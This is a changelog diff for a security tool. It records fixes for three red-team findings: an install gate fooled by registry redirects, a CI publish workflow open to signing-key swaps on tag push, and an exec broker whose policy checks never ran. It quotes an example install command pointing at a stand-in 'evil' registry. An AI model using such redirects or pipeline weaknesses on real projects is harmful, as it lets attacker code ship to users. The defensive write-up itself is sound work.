@@ -6,6 +6,31 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/).
 
 ## [Unreleased]
 
+### Security — red-team critical fixes
+
+A code-in-hand adversarial red-team of kit found three CONFIRMED critical
+false-greens; all three are now closed:
+
+- **Install-gate registry-redirect bypass.** `npm_config_registry=http://evil/ npm i lodash`
+  (and `PIP_INDEX_URL=…`, `--registry=…`, `-i <url>`) previously triaged the reputable
+  public NAME and returned **triage PASS** while the package manager pulled the code
+  from an attacker registry. `parseInstallCommand` now detects install-SOURCE
+  redirects (env vars + flags) and marks the command **unverifiable** (fail-closed)
+  unless the source is the known public default. `src/install-gate.ts`.
+- **CI publish supply-chain: tag-push → npm as `latest`.** `publish.yml` ran from the
+  pushed tag's tree and imported+ultimately-trusted the in-repo `maintainer-pubkey.asc`,
+  so anyone who could push a `v*` tag could swap the key and ship attacker code with
+  valid provenance. The publish job now runs under a protected `environment:`
+  (`npm-publish`, gate `NPM_TOKEN` behind required reviewers) and **pins the expected
+  key fingerprint** in a `MAINTAINER_KEY_FPR` secret — a mismatched/ swapped in-repo
+  key is refused (fail-closed; the secret is required). `.github/workflows/publish.yml`.
+- **exec-broker "dead code" false-green.** The resource gates only inspected declared
+  effect arrays, which the production caller never populated — so every op passed
+  regardless of policy. `brokerExec` now **fail-closed-denies a gated op that declares
+  no effect contract** under an active policy (a genuinely effect-free op opts in via
+  `declaredEffects: true`), turning a silent rubber-stamp into real enforcement.
+  `src/exec-broker/broker.ts`.
+
 ### Added
 
 - **Control-plane distribution — signed policy + revocation propagation** (Pelare 2,
